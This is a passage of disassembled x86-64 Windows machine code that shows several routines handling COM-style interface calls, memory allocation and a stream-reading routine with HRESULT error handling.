   1400047e9:	66 66 90             	data16 xchg %ax,%ax
   1400047ec:	66 66 66 90          	data16 data16 xchg %ax,%ax
   1400047f0:	48 8b 4e 08          	mov    0x8(%rsi),%rcx
   1400047f4:	ff 16                	call   *(%rsi)
   1400047f6:	48 8b 5e 10          	mov    0x10(%rsi),%rbx
   1400047fa:	48 8b ce             	mov    %rsi,%rcx
   1400047fd:	e8 6e e5 00 00       	call   0x140012d70
   140004802:	48 85 db             	test   %rbx,%rbx
   140004805:	48 8b f3             	mov    %rbx,%rsi
   140004808:	75 e6                	jne    0x1400047f0
   14000480a:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
   14000480f:	4c 89 67 08          	mov    %r12,0x8(%rdi)
   140004813:	4c 89 65 10          	mov    %r12,0x10(%rbp)
   140004817:	48 8b 4d 40          	mov    0x40(%rbp),%rcx
   14000481b:	48 85 c9             	test   %rcx,%rcx
   14000481e:	74 06                	je     0x140004826
   140004820:	48 8b 01             	mov    (%rcx),%rax
   140004823:	ff 50 10             	call   *0x10(%rax)
   140004826:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   14000482a:	ff 15 58 ca 01 00    	call   *0x1ca58(%rip)        # 0x140021288
   140004830:	44 89 27             	mov    %r12d,(%rdi)
   140004833:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140004838:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   14000483d:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140004842:	48 83 c4 20          	add    $0x20,%rsp
   140004846:	41 5c                	pop    %r12
   140004848:	c3                   	ret
   140004849:	cc                   	int3
   14000484a:	cc                   	int3
   14000484b:	cc                   	int3
   14000484c:	cc                   	int3
   14000484d:	cc                   	int3
   14000484e:	cc                   	int3
   14000484f:	cc                   	int3
   140004850:	48 83 ec 28          	sub    $0x28,%rsp
   140004854:	48 8b 09             	mov    (%rcx),%rcx
   140004857:	48 85 c9             	test   %rcx,%rcx
   14000485a:	74 06                	je     0x140004862
   14000485c:	48 8b 01             	mov    (%rcx),%rax
   14000485f:	ff 50 10             	call   *0x10(%rax)
   140004862:	48 83 c4 28          	add    $0x28,%rsp
   140004866:	c3                   	ret
   140004867:	cc                   	int3
   140004868:	cc                   	int3
   140004869:	cc                   	int3
   14000486a:	cc                   	int3
   14000486b:	cc                   	int3
   14000486c:	cc                   	int3
   14000486d:	cc                   	int3
   14000486e:	cc                   	int3
   14000486f:	cc                   	int3
   140004870:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140004875:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000487a:	53                   	push   %rbx
   14000487b:	56                   	push   %rsi
   14000487c:	57                   	push   %rdi
   14000487d:	41 54                	push   %r12
   14000487f:	41 55                	push   %r13
   140004881:	41 56                	push   %r14
   140004883:	41 57                	push   %r15
   140004885:	48 83 ec 40          	sub    $0x40,%rsp
   140004889:	48 c7 44 24 30 fe ff 	movq   $0xfffffffffffffffe,0x30(%rsp)
   140004890:	ff ff 
   140004892:	48 8b fa             	mov    %rdx,%rdi
   140004895:	4c 8b f1             	mov    %rcx,%r14
   140004898:	48 8b 02             	mov    (%rdx),%rax
   14000489b:	48 8d 94 24 98 00 00 	lea    0x98(%rsp),%rdx
   1400048a2:	00 
   1400048a3:	48 8b cf             	mov    %rdi,%rcx
   1400048a6:	ff 50 18             	call   *0x18(%rax)
   1400048a9:	85 c0                	test   %eax,%eax
   1400048ab:	0f 88 c7 01 00 00    	js     0x140004a78
   1400048b1:	45 33 ed             	xor    %r13d,%r13d
   1400048b4:	4d 8b fd             	mov    %r13,%r15
   1400048b7:	4c 89 ac 24 90 00 00 	mov    %r13,0x90(%rsp)
   1400048be:	00 
   1400048bf:	48 8b 84 24 98 00 00 	mov    0x98(%rsp),%rax
   1400048c6:	00 
   1400048c7:	0f b7 48 30          	movzwl 0x30(%rax),%ecx
   1400048cb:	41 89 4e 30          	mov    %ecx,0x30(%r14)
   1400048cf:	4d 89 6e 28          	mov    %r13,0x28(%r14)
   1400048d3:	85 c9                	test   %ecx,%ecx
   1400048d5:	0f 84 a5 00 00 00    	je     0x140004980
   1400048db:	48 8b d9             	mov    %rcx,%rbx
   1400048de:	b8 10 00 00 00       	mov    $0x10,%eax
   1400048e3:	48 f7 e1             	mul    %rcx
   1400048e6:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   1400048ed:	48 0f 40 c1          	cmovo  %rcx,%rax
   1400048f1:	48 83 c0 08          	add    $0x8,%rax
   1400048f5:	48 0f 42 c1          	cmovb  %rcx,%rax
   1400048f9:	48 8b c8             	mov    %rax,%rcx
   1400048fc:	e8 bf f0 00 00       	call   0x1400139c0
   140004901:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140004906:	48 85 c0             	test   %rax,%rax
   140004909:	74 2a                	je     0x140004935
   14000490b:	89 18                	mov    %ebx,(%rax)
   14000490d:	4c 8d 78 08          	lea    0x8(%rax),%r15
   140004911:	48 8d 05 58 f8 ff ff 	lea    -0x7a8(%rip),%rax        # 0x140004170
   140004918:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000491d:	4c 8d 0d 8c f9 ff ff 	lea    -0x674(%rip),%r9        # 0x1400042b0
   140004924:	44 8b c3             	mov    %ebx,%r8d
   140004927:	41 8d 55 10          	lea    0x10(%r13),%edx
   14000492b:	49 8b cf             	mov    %r15,%rcx
   14000492e:	e8 ed ef 00 00       	call   0x140013920
   140004933:	eb 03                	jmp    0x140004938
   140004935:	4d 8b fd             	mov    %r13,%r15
   140004938:	4c 89 bc 24 90 00 00 	mov    %r15,0x90(%rsp)
   14000493f:	00 
   140004940:	eb 1b                	jmp    0x14000495d
   140004942:	45 33 ed             	xor    %r13d,%r13d
   140004945:	4c 8b b4 24 80 00 00 	mov    0x80(%rsp),%r14
   14000494c:	00 
   14000494d:	48 8b bc 24 88 00 00 	mov    0x88(%rsp),%rdi
   140004954:	00 
   140004955:	4c 8b bc 24 90 00 00 	mov    0x90(%rsp),%r15
   14000495c:	00 
   14000495d:	4d 85 ff             	test   %r15,%r15
   140004960:	75 1e                	jne    0x140004980
   140004962:	48 8b 07             	mov    (%rdi),%rax
   140004965:	48 8b 94 24 98 00 00 	mov    0x98(%rsp),%rdx
   14000496c:	00 
   14000496d:	48 8b cf             	mov    %rdi,%rcx
   140004970:	ff 90 98 00 00 00    	call   *0x98(%rax)
   140004976:	b8 0e 00 07 80       	mov    $0x8007000e,%eax
   14000497b:	e9 fa 00 00 00       	jmp    0x140004a7a
   140004980:	41 8b f5             	mov    %r13d,%esi
   140004983:	41 83 7e 30 00       	cmpl   $0x0,0x30(%r14)
   140004988:	0f 8e d2 00 00 00    	jle    0x140004a60
   14000498e:	49 8b df             	mov    %r15,%rbx
   140004991:	66 66 90             	data16 xchg %ax,%ax
   140004994:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140004998:	66 66 66 90          	data16 data16 xchg %ax,%ax
   14000499c:	66 66 66 90          	data16 data16 xchg %ax,%ax
   1400049a0:	48 8b 07             	mov    (%rdi),%rax
   1400049a3:	4c 8d 84 24 90 00 00 	lea    0x90(%rsp),%r8
   1400049aa:	00 
   1400049ab:	8b d6                	mov    %esi,%edx
   1400049ad:	48 8b cf             	mov    %rdi,%rcx
   1400049b0:	ff 50 28             	call   *0x28(%rax)
   1400049b3:	85 c0                	test   %eax,%eax
   1400049b5:	0f 88 94 00 00 00    	js     0x140004a4f
   1400049bb:	4c 89 ac 24 88 00 00 	mov    %r13,0x88(%rsp)
   1400049c2:	00 
   1400049c3:	4c 8b 17             	mov    (%rdi),%r10
   1400049c6:	4c 89 6c 24 28       	mov    %r13,0x28(%rsp)
   1400049cb:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   1400049d0:	45 33 c9             	xor    %r9d,%r9d
   1400049d3:	4c 8d 84 24 88 00 00 	lea    0x88(%rsp),%r8
   1400049da:	00 
   1400049db:	48 8b 84 24 90 00 00 	mov    0x90(%rsp),%rax
   1400049e2:	00 
   1400049e3:	8b 10                	mov    (%rax),%edx
   1400049e5:	48 8b cf             	mov    %rdi,%rcx
   1400049e8:	41 ff 52 60          	call   *0x60(%r10)
   1400049ec:	85 c0                	test   %eax,%eax
   1400049ee:	78 3c                	js     0x140004a2c
   1400049f0:	4c 8b a4 24 88 00 00 	mov    0x88(%rsp),%r12
   1400049f7:	00 
   1400049f8:	4c 89 ac 24 88 00 00 	mov    %r13,0x88(%rsp)
   1400049ff:	00 
   140004a00:	48 8b 0b             	mov    (%rbx),%rcx
   140004a03:	49 3b cc             	cmp    %r12,%rcx
   140004a06:	74 09                	je     0x140004a11
   140004a08:	ff 15 f2 c9 01 00    	call   *0x1c9f2(%rip)        # 0x140021400
   140004a0e:	4c 89 23             	mov    %r12,(%rbx)
   140004a11:	48 8b 0b             	mov    (%rbx),%rcx
   140004a14:	ff 15 ee c9 01 00    	call   *0x1c9ee(%rip)        # 0x140021408
   140004a1a:	89 43 08             	mov    %eax,0x8(%rbx)
   140004a1d:	48 8b 94 24 90 00 00 	mov    0x90(%rsp),%rdx
   140004a24:	00 
   140004a25:	8b 02                	mov    (%rdx),%eax
   140004a27:	89 43 0c             	mov    %eax,0xc(%rbx)
   140004a2a:	eb 08                	jmp    0x140004a34
   140004a2c:	48 8b 94 24 90 00 00 	mov    0x90(%rsp),%rdx
   140004a33:	00 
   140004a34:	48 8b 07             	mov    (%rdi),%rax
   140004a37:	48 8b cf             	mov    %rdi,%rcx
   140004a3a:	ff 90 a0 00 00 00    	call   *0xa0(%rax)
   140004a40:	90                   	nop
   140004a41:	48 8b 8c 24 88 00 00 	mov    0x88(%rsp),%rcx
   140004a48:	00 
   140004a49:	ff 15 b1 c9 01 00    	call   *0x1c9b1(%rip)        # 0x140021400
   140004a4f:	83 c6 01             	add    $0x1,%esi
   140004a52:	48 83 c3 10          	add    $0x10,%rbx
   140004a56:	41 3b 76 30          	cmp    0x30(%r14),%esi
   140004a5a:	0f 8c 40 ff ff ff    	jl     0x1400049a0
   140004a60:	4d 89 7e 28          	mov    %r15,0x28(%r14)
   140004a64:	48 8b 07             	mov    (%rdi),%rax
   140004a67:	48 8b 94 24 98 00 00 	mov    0x98(%rsp),%rdx
   140004a6e:	00 
   140004a6f:	48 8b cf             	mov    %rdi,%rcx
   140004a72:	ff 90 98 00 00 00    	call   *0x98(%rax)
   140004a78:	33 c0                	xor    %eax,%eax
   140004a7a:	48 83 c4 40          	add    $0x40,%rsp
   140004a7e:	41 5f                	pop    %r15
   140004a80:	41 5e                	pop    %r14
   140004a82:	41 5d                	pop    %r13
   140004a84:	41 5c                	pop    %r12
   140004a86:	5f                   	pop    %rdi
   140004a87:	5e                   	pop    %rsi
   140004a88:	5b                   	pop    %rbx
   140004a89:	c3                   	ret
   140004a8a:	cc                   	int3
   140004a8b:	cc                   	int3
   140004a8c:	cc                   	int3
   140004a8d:	cc                   	int3
   140004a8e:	cc                   	int3
   140004a8f:	cc                   	int3
   140004a90:	40 55                	rex push %rbp
   140004a92:	48 83 ec 20          	sub    $0x20,%rsp
   140004a96:	48 8b ea             	mov    %rdx,%rbp
   140004a99:	48 8b 4d 38          	mov    0x38(%rbp),%rcx
   140004a9d:	e8 6e ee 00 00       	call   0x140013910
   140004aa2:	48 83 c4 20          	add    $0x20,%rsp
   140004aa6:	5d                   	pop    %rbp
   140004aa7:	c3                   	ret
   140004aa8:	cc                   	int3
   140004aa9:	cc                   	int3
   140004aaa:	cc                   	int3
   140004aab:	cc                   	int3
   140004aac:	cc                   	int3
   140004aad:	cc                   	int3
   140004aae:	cc                   	int3
   140004aaf:	cc                   	int3
   140004ab0:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140004ab5:	55                   	push   %rbp
   140004ab6:	48 83 ec 30          	sub    $0x30,%rsp
   140004aba:	48 8b ea             	mov    %rdx,%rbp
   140004abd:	48 8d 05 7e fe ff ff 	lea    -0x182(%rip),%rax        # 0x140004942
   140004ac4:	eb 00                	jmp    0x140004ac6
   140004ac6:	48 83 c4 30          	add    $0x30,%rsp
   140004aca:	5d                   	pop    %rbp
   140004acb:	c3                   	ret
   140004acc:	cc                   	int3
   140004acd:	cc                   	int3
   140004ace:	cc                   	int3
   140004acf:	cc                   	int3
   140004ad0:	40 55                	rex push %rbp
   140004ad2:	48 83 ec 20          	sub    $0x20,%rsp
   140004ad6:	48 8b ea             	mov    %rdx,%rbp
   140004ad9:	48 8d 8d 88 00 00 00 	lea    0x88(%rbp),%rcx
   140004ae0:	e8 8b f6 ff ff       	call   0x140004170
   140004ae5:	48 83 c4 20          	add    $0x20,%rsp
   140004ae9:	5d                   	pop    %rbp
   140004aea:	c3                   	ret
   140004aeb:	cc                   	int3
   140004aec:	cc                   	int3
   140004aed:	cc                   	int3
   140004aee:	cc                   	int3
   140004aef:	cc                   	int3
   140004af0:	48 85 c9             	test   %rcx,%rcx
   140004af3:	74 60                	je     0x140004b55
   140004af5:	57                   	push   %rdi
   140004af6:	48 83 ec 20          	sub    $0x20,%rsp
   140004afa:	48 8b f9             	mov    %rcx,%rdi
   140004afd:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   140004b01:	48 85 c9             	test   %rcx,%rcx
   140004b04:	74 06                	je     0x140004b0c
   140004b06:	48 8b 01             	mov    (%rcx),%rax
   140004b09:	ff 50 10             	call   *0x10(%rax)
   140004b0c:	48 8b 4f 28          	mov    0x28(%rdi),%rcx
   140004b10:	48 c7 47 18 00 00 00 	movq   $0x0,0x18(%rdi)
   140004b17:	00 
   140004b18:	48 85 c9             	test   %rcx,%rcx
   140004b1b:	74 2b                	je     0x140004b48
   140004b1d:	44 8b 41 f8          	mov    -0x8(%rcx),%r8d
   140004b21:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140004b26:	48 8d 59 f8          	lea    -0x8(%rcx),%rbx
   140004b2a:	4c 8d 0d 3f f6 ff ff 	lea    -0x9c1(%rip),%r9        # 0x140004170
   140004b31:	ba 10 00 00 00       	mov    $0x10,%edx
   140004b36:	e8 25 ef 00 00       	call   0x140013a60
   140004b3b:	48 8b cb             	mov    %rbx,%rcx
   140004b3e:	e8 cd ed 00 00       	call   0x140013910
   140004b43:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004b48:	48 c7 47 28 00 00 00 	movq   $0x0,0x28(%rdi)
   140004b4f:	00 
   140004b50:	48 83 c4 20          	add    $0x20,%rsp
   140004b54:	5f                   	pop    %rdi
   140004b55:	c2 00 00             	ret    $0x0
   140004b58:	cc                   	int3
   140004b59:	cc                   	int3
   140004b5a:	cc                   	int3
   140004b5b:	cc                   	int3
   140004b5c:	cc                   	int3
   140004b5d:	cc                   	int3
   140004b5e:	cc                   	int3
   140004b5f:	cc                   	int3
   140004b60:	48 83 ec 28          	sub    $0x28,%rsp
   140004b64:	48 8b 09             	mov    (%rcx),%rcx
   140004b67:	48 85 c9             	test   %rcx,%rcx
   140004b6a:	74 06                	je     0x140004b72
   140004b6c:	48 8b 01             	mov    (%rcx),%rax
   140004b6f:	ff 50 10             	call   *0x10(%rax)
   140004b72:	48 83 c4 28          	add    $0x28,%rsp
   140004b76:	c3                   	ret
   140004b77:	cc                   	int3
   140004b78:	cc                   	int3
   140004b79:	cc                   	int3
   140004b7a:	cc                   	int3
   140004b7b:	cc                   	int3
   140004b7c:	cc                   	int3
   140004b7d:	cc                   	int3
   140004b7e:	cc                   	int3
   140004b7f:	cc                   	int3
   140004b80:	48 83 ec 28          	sub    $0x28,%rsp
   140004b84:	48 8b 09             	mov    (%rcx),%rcx
   140004b87:	48 85 c9             	test   %rcx,%rcx
   140004b8a:	74 06                	je     0x140004b92
   140004b8c:	48 8b 01             	mov    (%rcx),%rax
   140004b8f:	ff 50 10             	call   *0x10(%rax)
   140004b92:	48 83 c4 28          	add    $0x28,%rsp
   140004b96:	c3                   	ret
   140004b97:	cc                   	int3
   140004b98:	cc                   	int3
   140004b99:	cc                   	int3
   140004b9a:	cc                   	int3
   140004b9b:	cc                   	int3
   140004b9c:	cc                   	int3
   140004b9d:	cc                   	int3
   140004b9e:	cc                   	int3
   140004b9f:	cc                   	int3
   140004ba0:	48 8b c4             	mov    %rsp,%rax
   140004ba3:	56                   	push   %rsi
   140004ba4:	57                   	push   %rdi
   140004ba5:	41 54                	push   %r12
   140004ba7:	48 81 ec 50 04 00 00 	sub    $0x450,%rsp
   140004bae:	48 c7 44 24 40 fe ff 	movq   $0xfffffffffffffffe,0x40(%rsp)
   140004bb5:	ff ff 
   140004bb7:	48 89 58 18          	mov    %rbx,0x18(%rax)
   140004bbb:	48 89 68 20          	mov    %rbp,0x20(%rax)
   140004bbf:	48 8b 05 0a 97 02 00 	mov    0x2970a(%rip),%rax        # 0x14002e2d0
   140004bc6:	48 33 c4             	xor    %rsp,%rax
   140004bc9:	48 89 84 24 40 04 00 	mov    %rax,0x440(%rsp)
   140004bd0:	00 
   140004bd1:	48 8b f2             	mov    %rdx,%rsi
   140004bd4:	48 8b f9             	mov    %rcx,%rdi
   140004bd7:	45 33 e4             	xor    %r12d,%r12d
   140004bda:	4c 89 22             	mov    %r12,(%rdx)
   140004bdd:	48 85 c9             	test   %rcx,%rcx
   140004be0:	75 07                	jne    0x140004be9
   140004be2:	33 c0                	xor    %eax,%eax
   140004be4:	e9 97 01 00 00       	jmp    0x140004d80
   140004be9:	48 8b 01             	mov    (%rcx),%rax
   140004bec:	4c 8d 4c 24 20       	lea    0x20(%rsp),%r9
   140004bf1:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140004bf7:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   140004bfc:	ff 50 18             	call   *0x18(%rax)
   140004bff:	85 c0                	test   %eax,%eax
   140004c01:	0f 88 79 01 00 00    	js     0x140004d80
   140004c07:	48 8b 07             	mov    (%rdi),%rax
   140004c0a:	4c 8d 4c 24 20       	lea    0x20(%rsp),%r9
   140004c0f:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140004c15:	48 8d 54 24 38       	lea    0x38(%rsp),%rdx
   140004c1a:	48 8b cf             	mov    %rdi,%rcx
   140004c1d:	ff 50 18             	call   *0x18(%rax)
   140004c20:	85 c0                	test   %eax,%eax
   140004c22:	0f 88 58 01 00 00    	js     0x140004d80
   140004c28:	48 8b 07             	mov    (%rdi),%rax
   140004c2b:	4c 8d 4c 24 20       	lea    0x20(%rsp),%r9
   140004c30:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140004c36:	48 8d 54 24 24       	lea    0x24(%rsp),%rdx
   140004c3b:	48 8b cf             	mov    %rdi,%rcx
   140004c3e:	ff 50 18             	call   *0x18(%rax)
   140004c41:	85 c0                	test   %eax,%eax
   140004c43:	0f 88 37 01 00 00    	js     0x140004d80
   140004c49:	8b 54 24 24          	mov    0x24(%rsp),%edx
   140004c4d:	85 d2                	test   %edx,%edx
   140004c4f:	0f 84 9f 00 00 00    	je     0x140004cf4
   140004c55:	85 d2                	test   %edx,%edx
   140004c57:	75 0a                	jne    0x140004c63
   140004c59:	49 8b dc             	mov    %r12,%rbx
   140004c5c:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140004c61:	eb 20                	jmp    0x140004c83
   140004c63:	33 c9                	xor    %ecx,%ecx
   140004c65:	ff 15 7d c7 01 00    	call   *0x1c77d(%rip)        # 0x1400213e8
   140004c6b:	48 8b d8             	mov    %rax,%rbx
   140004c6e:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140004c73:	48 85 c0             	test   %rax,%rax
   140004c76:	75 0b                	jne    0x140004c83
   140004c78:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140004c7d:	e8 1e f4 ff ff       	call   0x1400040a0
   140004c82:	90                   	nop
   140004c83:	48 8b cb             	mov    %rbx,%rcx
   140004c86:	ff 15 7c c7 01 00    	call   *0x1c77c(%rip)        # 0x140021408
   140004c8c:	85 c0                	test   %eax,%eax
   140004c8e:	75 13                	jne    0x140004ca3
   140004c90:	48 8b cb             	mov    %rbx,%rcx
   140004c93:	ff 15 67 c7 01 00    	call   *0x1c767(%rip)        # 0x140021400
   140004c99:	b8 0e 00 07 80       	mov    $0x8007000e,%eax
   140004c9e:	e9 dd 00 00 00       	jmp    0x140004d80
   140004ca3:	44 8b 44 24 24       	mov    0x24(%rsp),%r8d
   140004ca8:	41 83 c0 01          	add    $0x1,%r8d
   140004cac:	4d 03 c0             	add    %r8,%r8
   140004caf:	33 d2                	xor    %edx,%edx
   140004cb1:	48 8b cb             	mov    %rbx,%rcx
   140004cb4:	e8 17 ef 00 00       	call   0x140013bd0
   140004cb9:	4c 8b 1f             	mov    (%rdi),%r11
   140004cbc:	44 8b 44 24 24       	mov    0x24(%rsp),%r8d
   140004cc1:	45 03 c0             	add    %r8d,%r8d
   140004cc4:	4c 8d 4c 24 20       	lea    0x20(%rsp),%r9
   140004cc9:	48 8b d3             	mov    %rbx,%rdx
   140004ccc:	48 8b cf             	mov    %rdi,%rcx
   140004ccf:	41 ff 53 18          	call   *0x18(%r11)
   140004cd3:	8b e8                	mov    %eax,%ebp
   140004cd5:	85 c0                	test   %eax,%eax
   140004cd7:	79 10                	jns    0x140004ce9
   140004cd9:	48 8b cb             	mov    %rbx,%rcx
   140004cdc:	ff 15 1e c7 01 00    	call   *0x1c71e(%rip)        # 0x140021400
   140004ce2:	8b c5                	mov    %ebp,%eax
   140004ce4:	e9 97 00 00 00       	jmp    0x140004d80
   140004ce9:	48 89 1e             	mov    %rbx,(%rsi)
   140004cec:	33 c9                	xor    %ecx,%ecx
   140004cee:	ff 15 0c c7 01 00    	call   *0x1c70c(%rip)        # 0x140021400
   140004cf4:	0f b7 4c 24 28       	movzwl 0x28(%rsp),%ecx
   140004cf9:	66 81 f9 7a 03       	cmp    $0x37a,%cx
   140004cfe:	74 17                	je     0x140004d17
   140004d00:	66 81 f9 7b 03       	cmp    $0x37b,%cx
   140004d05:	74 10                	je     0x140004d17
   140004d07:	b8 05 40 00 80       	mov    $0x80004005,%eax
   140004d0c:	66 81 f9 76 03       	cmp    $0x376,%cx
   140004d11:	41 0f 44 c4          	cmove  %r12d,%eax
   140004d15:	eb 69                	jmp    0x140004d80
   140004d17:	48 8b 07             	mov    (%rdi),%rax
   140004d1a:	4c 8d 4c 24 20       	lea    0x20(%rsp),%r9
   140004d1f:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140004d25:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140004d2a:	48 8b cf             	mov    %rdi,%rcx
   140004d2d:	ff 50 18             	call   *0x18(%rax)
   140004d30:	85 c0                	test   %eax,%eax
   140004d32:	78 4c                	js     0x140004d80
   140004d34:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   140004d38:	83 c1 fc             	add    $0xfffffffc,%ecx
